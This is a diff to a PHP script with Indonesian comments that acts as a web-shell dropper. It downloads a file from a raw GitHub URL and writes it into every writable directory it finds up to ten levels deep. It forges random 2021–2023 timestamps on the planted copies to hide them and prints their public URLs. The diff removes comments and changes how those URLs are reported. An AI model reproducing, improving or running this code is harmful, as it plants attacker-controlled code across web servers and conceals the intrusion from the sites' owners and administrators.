@@ -4,10 +4,8 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
-// Link RAW file GitHub yang akan disalin
 $remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/im';
 
-// Fungsi ambil konten dari URL
 function fetch_from_url($url) {
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
@@ -25,7 +23,6 @@ function fetch_from_url($url) {
     }
 }
 
-// Fungsi scan folder writable
 function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     $result = [];
     if ($currentDepth > $maxDepth) return $result;
@@ -44,7 +41,6 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     return $result;
 }
 
-// Fungsi buat tanggal acak dengan batas tahun 2021 sampai 2023
 function generate_random_datetime() {
     $year = rand(2021, 2023);
     $month = rand(1, 12);
@@ -54,14 +50,12 @@ function generate_random_datetime() {
     return sprintf('%04d-%02d-%02d %02d:%02d', $year, $month, $day, $hour, $minute);
 }
 
-// Ambil isi file dari GitHub
 $originalContent = fetch_from_url($remoteFile);
 
 if (!$originalContent || strlen($originalContent) < 10) {
     exit("❌ Gagal mengunduh konten dari GitHub.\n");
 }
 
-// Cari folder writable
 $allWritable = scanWritableDirs(__DIR__, 10);
 
 if (empty($allWritable)) {
@@ -88,22 +82,21 @@ foreach ($targetFolders as $folder) {
     if (@file_put_contents($target, $modifiedContent)) {
         @touch($target, $timestamp, $timestamp);
 
-        // Buat URL dari path lokal
-        $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($target));
+        $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
+        $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
         $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
         $host = $_SERVER['HTTP_HOST'];
-        $url = $protocol . '://' . $host . $relativePath;
+        $url = rtrim($protocol . '://' . $host . $relativePath, '/');
 
         $successCount++;
-        $uploadedURLs[] = "$url (Modify: $randomDateTime)";
+        $uploadedURLs[] = $url;
     }
 }
 
-// Output hasil
 if ($successCount > 0) {
     echo "✅ Berhasil menyimpan ke $successCount folder:\n";
     foreach ($uploadedURLs as $url) {
-        echo "- $url\n";
+        echo "$url\n";
     }
 } else {
     echo "❌ Gagal menyalin ke folder manapun.\n";
